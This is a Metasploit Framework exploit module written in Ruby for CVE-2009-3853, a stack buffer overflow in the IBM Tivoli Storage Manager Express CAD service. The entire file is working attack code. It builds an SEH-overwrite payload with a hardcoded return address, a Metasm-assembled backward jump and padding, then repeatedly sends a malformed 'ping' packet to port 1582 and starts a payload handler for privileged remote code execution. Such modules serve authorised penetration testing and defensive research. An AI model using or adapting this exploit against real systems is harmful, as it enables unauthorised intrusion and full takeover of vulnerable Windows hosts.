##
# $Id: ibm_tsm_cad_ping.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'IBM Tivoli Storage Manager Express CAD Service Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the IBM Tivoli Storage Manager Express CAD Service.
				By sending a "ping" packet containing a long string, an attacker can execute arbitrary code.

				NOTE: the dsmcad.exe service must be in a particular state (CadWaitingStatus = 1) in order
				for the vulnerable code to be reached. This state doesn't appear to be reachable when the
				TSM server is not running. This service does not restart.
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2009-3853' ],
					[ 'OSVDB', '59632' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 380, # offset to seh is 384
					'BadChars' => '', # none!
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# this target should be pretty universal..
					# dbghelp.dll is shipped with TSM Express, and hasn't been kept up-to-date..
					[ 'IBM Tivoli Storage Manager Express 5.3.6.2', { 'Ret' => 0x028495d3 } ], # p/p/r dbghelp.dll v6.0.17.0
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Nov 04 2009'))

		register_options( [ Opt::RPORT(1582) ], self.class )
	end

	def exploit

		print_status("Trying target %s..." % target.name)

		# wchar_t buf[64];

		#print_status("Generating sploit data...")
		distance = payload_space + 8
		backjmp = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string
		copy_len = distance + backjmp.length + (1024*3)

		sploit = [0,copy_len].pack('n*')
		sploit << payload.encoded
		sploit << generate_seh_record(target.ret)
		sploit << backjmp
		# force hitting end of the stack
		sploit << rand_text(1024) * 3

		data = [sploit.length,0x26,0xa5].pack('nCC')
		data << sploit

		got_it = false
		while not got_it
			connect
			print_status("Sending nasty ping request...")
			sock.put(data)

			begin
				buf = sock.get_once(-1, 5)
			rescue
				print_status("Hrm, the service is probably in the wrong state, stand by...")
				disconnect
				select(nil, nil, nil, 5)
				next
			end
			got_it = true
		end

		print_status("Starting handler...")
		handler
		disconnect
	end

end
